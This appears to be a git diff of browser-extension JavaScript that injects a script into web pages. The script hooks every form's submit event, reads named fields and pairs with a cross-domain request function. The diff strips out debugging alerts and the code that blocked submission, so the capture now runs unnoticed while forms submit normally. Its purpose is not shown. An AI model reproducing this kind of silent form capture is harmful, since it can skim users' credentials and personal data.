@@ -57,10 +57,6 @@ function sendRequestInfo(url, method, body) {
         dataType: 'json',
         processData: false,
         crossDomain: true
-    }).always(function () {
-        alert('Url: ' + data.url);
-        alert('Method: ' + data.verb);
-        alert('Body: ' + data.body);
     });
 }
 
@@ -71,14 +67,9 @@ function sendRequestInfo(url, method, body) {
  */
 function injectFormScript(fieldString) {
     var script = document.createElement('script');
-    script.id = 'test';
-    var html = "document.getElementsByTagName('body')[0].addEventListener('click', function () {alert('BODY!!!');}); " +
-      "var forms = document.getElementsByTagName('form'); " +
+    var html = "var forms = document.getElementsByTagName('form'); " +
       "for (var i = 0; i < forms.length; ++i) { " +
         "forms[i].addEventListener('submit', function (event) { " +
-          "event.preventDefault(); " +
-          "event.stopPropagation(); " +
-          "event.stopImmediatePropagation(); " +
           "var fieldString = '" + fieldString + "'; " +
           "var fieldNames = fieldString.split(' '); " +
           "var form = event.target;" +
@@ -115,7 +106,6 @@ function injectFormScript(fieldString) {
 
 function attachEvents() {
     // $(document.defaultView.document).ajaxSend(function (event, request, settings) {
-    //     alert('HELLO ', request.data);
     //     var username = '';
     //
     //     if (request.data) {
